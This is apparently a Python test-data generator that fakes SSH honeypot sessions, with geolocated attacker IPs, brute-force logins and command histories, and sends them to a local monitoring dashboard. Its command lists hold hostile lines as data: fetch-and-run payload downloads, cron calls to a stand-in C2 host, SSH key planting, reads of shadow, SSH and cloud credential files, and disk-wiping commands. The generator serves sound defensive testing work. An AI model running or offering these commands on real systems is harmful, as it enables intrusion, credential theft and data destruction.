#!/usr/bin/env python3
"""
Generate comprehensive test data for OTORI monitoring dashboard.
Creates realistic honeypot sessions with geo coordinates for map visualization.
"""

import random
import time
import uuid
from datetime import datetime, timedelta, UTC
import requests

API_URL = "http://localhost:8000"

# Realistic attacker IPs with countries and coordinates
ATTACKER_PROFILES = [
    # (IP, country_code, country_name, city, latitude, longitude, asn_org)
    ("185.220.101.42", "DE", "Germany", "Frankfurt", 50.1109, 8.6821, "Hetzner Online GmbH"),
    ("185.220.101.45", "DE", "Germany", "Berlin", 52.5200, 13.4050, "Hetzner Online GmbH"),
    ("45.155.205.233", "RU", "Russia", "Moscow", 55.7558, 37.6173, "Selectel Ltd"),
    ("45.155.205.100", "RU", "Russia", "Saint Petersburg", 59.9343, 30.3351, "Selectel Ltd"),
    ("91.243.34.12", "RU", "Russia", "Novosibirsk", 55.0084, 82.9357, "PJSC Rostelecom"),
    ("103.152.118.24", "CN", "China", "Beijing", 39.9042, 116.4074, "China Telecom"),
    ("103.152.118.55", "CN", "China", "Shanghai", 31.2304, 121.4737, "China Unicom"),
    ("218.92.0.107", "CN", "China", "Guangzhou", 23.1291, 113.2644, "China Telecom"),
    ("5.188.86.114", "NL", "Netherlands", "Amsterdam", 52.3676, 4.9041, "G-Core Labs S.A."),
    ("193.42.33.75", "UA", "Ukraine", "Kyiv", 50.4501, 30.5234, "Datagroup JSC"),
    ("91.240.118.172", "RO", "Romania", "Bucharest", 44.4268, 26.1025, "M247 Europe SRL"),
    ("194.163.174.206", "US", "United States", "New York", 40.7128, -74.0060, "DigitalOcean LLC"),
    ("194.163.174.210", "US", "United States", "Los Angeles", 34.0522, -118.2437, "DigitalOcean LLC"),
    ("192.241.214.87", "US", "United States", "San Francisco", 37.7749, -122.4194, "DigitalOcean LLC"),
    ("78.128.113.130", "BG", "Bulgaria", "Sofia", 42.6977, 23.3219, "A1 Bulgaria EAD"),
    ("185.156.73.54", "IR", "Iran", "Tehran", 35.6892, 51.3890, "Afranet Co"),
    ("103.75.118.47", "VN", "Vietnam", "Ho Chi Minh City", 10.8231, 106.6297, "VNPT Corp"),
    ("103.75.118.80", "VN", "Vietnam", "Hanoi", 21.0285, 105.8542, "VNPT Corp"),
    ("45.95.169.120", "SE", "Sweden", "Stockholm", 59.3293, 18.0686, "OVPN Integritet AB"),
    ("185.107.56.78", "PL", "Poland", "Warsaw", 52.2297, 21.0122, "OVH SAS"),
    ("51.15.43.205", "FR", "France", "Paris", 48.8566, 2.3522, "Scaleway S.A.S."),
    ("51.15.43.210", "FR", "France", "Marseille", 43.2965, 5.3698, "Scaleway S.A.S."),
    ("89.248.167.131", "NL", "Netherlands", "Rotterdam", 51.9244, 4.4777, "Serverius Holding B.V."),
    ("45.33.32.156", "US", "United States", "Dallas", 32.7767, -96.7970, "Linode LLC"),
    ("159.65.140.123", "SG", "Singapore", "Singapore", 1.3521, 103.8198, "DigitalOcean LLC"),
    ("167.99.78.45", "IN", "India", "Mumbai", 19.0760, 72.8777, "DigitalOcean LLC"),
    ("167.99.78.90", "IN", "India", "Bangalore", 12.9716, 77.5946, "DigitalOcean LLC"),
    ("200.7.105.34", "BR", "Brazil", "Sao Paulo", -23.5505, -46.6333, "Algar Telecom"),
    ("200.7.105.80", "BR", "Brazil", "Rio de Janeiro", -22.9068, -43.1729, "Algar Telecom"),
    ("41.76.108.46", "ZA", "South Africa", "Johannesburg", -26.2041, 28.0473, "Internet Solutions"),
    ("102.37.123.15", "NG", "Nigeria", "Lagos", 6.5244, 3.3792, "MTN Nigeria"),
    ("196.216.2.24", "KE", "Kenya", "Nairobi", -1.2921, 36.8219, "Safaricom PLC"),
    ("203.217.180.34", "AU", "Australia", "Sydney", -33.8688, 151.2093, "Telstra Corporation"),
    ("103.41.124.56", "JP", "Japan", "Tokyo", 35.6762, 139.6503, "NTT Communications"),
    ("103.41.124.90", "JP", "Japan", "Osaka", 34.6937, 135.5023, "NTT Communications"),
    ("175.45.176.12", "KR", "South Korea", "Seoul", 37.5665, 126.9780, "Korea Telecom"),
]

# Common usernames attackers try
USERNAMES = ["root", "admin", "ubuntu", "pi", "user", "test", "oracle", "postgres",
             "mysql", "guest", "ftpuser", "www-data", "nobody", "deploy", "git"]

# Common passwords attackers try
PASSWORDS = ["123456", "password", "admin", "root", "123123", "qwerty", "1234",
             "12345678", "admin123", "pass123", "toor", "changeme", "letmein",
             "welcome", "monkey", "dragon", "master", "abc123"]

# Recon commands (low severity)
RECON_COMMANDS = [
    "uname -a", "whoami", "id", "pwd", "ls -la", "cat /etc/passwd",
    "cat /etc/os-release", "hostname", "ifconfig", "ip addr", "netstat -an",
    "ps aux", "df -h", "free -m", "uptime", "w", "last", "cat /proc/cpuinfo",
    "lscpu", "cat /etc/hosts", "env", "printenv", "cat /etc/resolv.conf",
]

# Download/execution commands (high severity)
DOWNLOAD_COMMANDS = [
    "wget http://45.95.169.x/bot.sh -O /tmp/bot.sh && chmod +x /tmp/bot.sh && /tmp/bot.sh",
    "curl -O http://185.x.x.x/miner && chmod 777 miner && ./miner",
    "cd /tmp && wget http://103.x.x.x/xmrig && chmod +x xmrig && nohup ./xmrig &",
    "wget -qO- http://91.x.x.x/install.sh | bash",
    "curl http://45.x.x.x/payload | sh",
    "busybox wget http://185.x.x.x/mirai -O /tmp/.m && chmod +x /tmp/.m && /tmp/.m",
    "cd /tmp; wget http://103.x.x.x/bins.sh; chmod 777 bins.sh; ./bins.sh",
]

# Persistence commands (critical)
PERSISTENCE_COMMANDS = [
    "echo '* * * * * /tmp/bot.sh' >> /var/spool/cron/crontabs/root",
    "crontab -l | echo '*/5 * * * * curl http://c2.bad/ping' | crontab -",
    "echo 'ssh-rsa AAAAB3NzaC1yc2E...' >> /root/.ssh/authorized_keys",
    "cp /tmp/backdoor /usr/local/bin/.hidden && chmod +x /usr/local/bin/.hidden",
    "echo '/tmp/malware &' >> /etc/rc.local",
    "systemctl enable malware.service",
    "echo '#!/bin/bash\n/tmp/bot &' > /etc/init.d/update && chmod +x /etc/init.d/update",
]

# Credential access commands (critical)
CREDENTIAL_COMMANDS = [
    "cat /etc/shadow", "cat /root/.ssh/id_rsa", "cat /root/.bash_history",
    "find / -name '*.pem' 2>/dev/null", "grep -r password /etc/*",
    "cat /root/.my.cnf", "cat /etc/mysql/my.cnf", "cat ~/.aws/credentials",
    "cat /var/www/.env", "find / -name 'wp-config.php' 2>/dev/null",
]

# Lateral movement commands (high)
LATERAL_COMMANDS = [
    "ssh root@192.168.1.10", "scp /tmp/backdoor root@192.168.1.20:/tmp/",
    "ssh -o StrictHostKeyChecking=no user@10.0.0.5",
    "for i in $(seq 1 254); do ssh -o ConnectTimeout=1 root@192.168.1.$i; done",
]

# Impact commands (critical)
IMPACT_COMMANDS = [
    "rm -rf / --no-preserve-root", "dd if=/dev/zero of=/dev/sda",
    ":(){ :|:& };:", "chmod -R 777 /", "rm -rf /var/log/*",
]


def generate_session(sensor_id: str, is_bot: bool = True) -> list:
    """Generate a complete session with events."""
    events = []
    session_id = f"session-{uuid.uuid4().hex[:12]}"

    # Pick attacker profile
    profile = random.choice(ATTACKER_PROFILES)
    src_ip, country_code, country_name, city, lat, lon, asn_org = profile

    # Session timing - spread across last 24 hours
    base_time = datetime.now(UTC) - timedelta(
        hours=random.randint(0, 23),
        minutes=random.randint(0, 59),
        seconds=random.randint(0, 59)
    )
    current_time = base_time
    honeypot_type = random.choice(["ia", "classic"])

    # 1. Connect event with geo data
    events.append({
        "timestamp": current_time.isoformat(),
        "sensor": sensor_id,
        "honeypot_type": honeypot_type,
        "session_id": session_id,
        "src_ip": src_ip,
        "src_port": random.randint(40000, 65000),
        "dst_ip": "10.0.0.1",
        "dst_port": 22,
        "protocol": "ssh",
        "event_type": "connect",
        # Geo data
        "country_code": country_code,
        "country_name": country_name,
        "city": city,
        "latitude": lat,
        "longitude": lon,
        "asn_org": asn_org,
    })
    current_time += timedelta(seconds=random.uniform(0.5, 2))

    # 2. Login attempts
    username = random.choice(USERNAMES)
    num_attempts = random.randint(1, 5) if is_bot else random.randint(1, 3)
    login_success = random.random() < 0.7

    for i in range(num_attempts):
        password = random.choice(PASSWORDS)
        is_last = i == num_attempts - 1

        events.append({
            "timestamp": current_time.isoformat(),
            "sensor": sensor_id,
            "honeypot_type": honeypot_type,
            "session_id": session_id,
            "src_ip": src_ip,
            "event_type": "login_success" if (is_last and login_success) else "login_failed",
            "username": username,
            "password": password,
        })
        current_time += timedelta(seconds=random.uniform(0.1, 1) if is_bot else random.uniform(1, 5))

    # 3. Commands (if login successful)
    if login_success:
        profile_type = random.choices(
            ["recon_only", "download_attack", "full_attack", "credential_theft"],
            weights=[30, 25, 20, 25]
        )[0]

        commands = []

        if profile_type == "recon_only":
            commands = random.sample(RECON_COMMANDS, random.randint(3, 8))
        elif profile_type == "download_attack":
            commands = random.sample(RECON_COMMANDS, random.randint(2, 4))
            commands += random.sample(DOWNLOAD_COMMANDS, random.randint(1, 2))
        elif profile_type == "full_attack":
            commands = random.sample(RECON_COMMANDS, random.randint(2, 4))
            commands += random.sample(CREDENTIAL_COMMANDS, random.randint(1, 2))
            commands += random.sample(PERSISTENCE_COMMANDS, random.randint(1, 2))
            if random.random() < 0.3:
                commands += random.sample(IMPACT_COMMANDS, 1)
        elif profile_type == "credential_theft":
            commands = random.sample(RECON_COMMANDS, random.randint(1, 3))
            commands += random.sample(CREDENTIAL_COMMANDS, random.randint(2, 4))
            if random.random() < 0.5:
                commands += random.sample(LATERAL_COMMANDS, 1)

        for cmd in commands:
            events.append({
                "timestamp": current_time.isoformat(),
                "sensor": sensor_id,
                "honeypot_type": honeypot_type,
                "session_id": session_id,
                "src_ip": src_ip,
                "event_type": "command",
                "command": cmd,
                "username": username,
            })
            if is_bot:
                current_time += timedelta(seconds=random.uniform(0.1, 0.5))
            else:
                current_time += timedelta(seconds=random.uniform(2, 15))

    # 4. Close event
    duration = (current_time - base_time).total_seconds()
    events.append({
        "timestamp": current_time.isoformat(),
        "sensor": sensor_id,
        "honeypot_type": honeypot_type,
        "session_id": session_id,
        "src_ip": src_ip,
        "event_type": "closed",
        "duration_sec": duration,
    })

    return events


def register_sensor() -> str:
    """Register a test sensor."""
    response = requests.post(f"{API_URL}/register", json={
        "hostname": "test-honeypot",
        "honeypot_type": "ia",
        "ip": "10.0.0.1",
    })
    data = response.json()
    return data["sensor_id"]


def send_event(event: dict) -> bool:
    """Send an event to the API."""
    try:
        response = requests.post(f"{API_URL}/ingest", json=event)
        return response.status_code == 200
    except Exception as e:
        print(f"Error sending event: {e}")
        return False


def main():
    print("=" * 50)
    print("OTORI Test Data Generator - With Geo Coordinates")
    print("=" * 50 + "\n")

    # Register sensor
    print("Registering test sensor...")
    try:
        sensor_id = register_sensor()
        print(f"Sensor ID: {sensor_id}\n")
    except Exception as e:
        print(f"Error registering sensor: {e}")
        print("Make sure the server is running (make run)")
        return

    # Generate sessions
    num_sessions = 50
    print(f"Generating {num_sessions} test sessions...\n")

    # Statistics
    countries_seen = set()
    total_events = 0
    total_commands = 0

    for i in range(num_sessions):
        is_bot = random.random() < 0.6
        events = generate_session(sensor_id, is_bot)

        session_id = events[0]["session_id"]
        src_ip = events[0]["src_ip"]
        num_commands = sum(1 for e in events if e["event_type"] == "command")
        total_commands += num_commands

        # Find country
        for profile in ATTACKER_PROFILES:
            if profile[0] == src_ip:
                countries_seen.add(profile[1])
                break

        print(f"[{i+1:2d}/{num_sessions}] {src_ip:18s} | {num_commands:2d} cmds | {'Bot' if is_bot else 'Human':5s}")

        for event in events:
            success = send_event(event)
            if not success:
                print(f"         Failed: {event['event_type']}")
            total_events += 1
            time.sleep(0.02)

        time.sleep(0.1)

    print("\n" + "=" * 50)
    print("Generation Complete!")
    print("=" * 50)
    print(f"  Sessions:  {num_sessions}")
    print(f"  Events:    {total_events}")
    print(f"  Commands:  {total_commands}")
    print(f"  Countries: {len(countries_seen)} ({', '.join(sorted(countries_seen))})")
    print(f"\nOpen http://localhost:8000 to view the dashboard")
    print("Click on 'Geography' to see the attack map")


if __name__ == "__main__":
    main()
